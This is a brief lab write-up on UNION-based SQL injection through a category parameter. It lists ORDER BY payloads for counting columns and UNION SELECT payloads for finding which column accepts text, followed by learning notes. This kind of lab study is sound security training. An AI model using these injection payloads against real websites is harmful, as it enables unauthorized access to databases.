# Lab Name
SQL injection UNION attack, finding a column containing text

## Vulnerability
SQL Injection (UNION-based)

## Objective
Exploit UNION-based SQL Injection to finding a column containing text.

## Entry Point
Category parameter

## Payload Used
Determine number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
Test which column accept text
' UNION SELECT 'test', NULL, NULL--
' UNION SELECT NULL, 'test', NULL--
' UNION SELECT NULL, NULL, 'test'--

## Result
Identified that the second column containing accepts text-based data.

## Learning
ORDER BY is used to determine the number of columns.
UNION SELECT must match the exact number of columns.
NULL is used as a placeholder when data types are unkonwn
Text value can be tested using dummy string like 'test'.
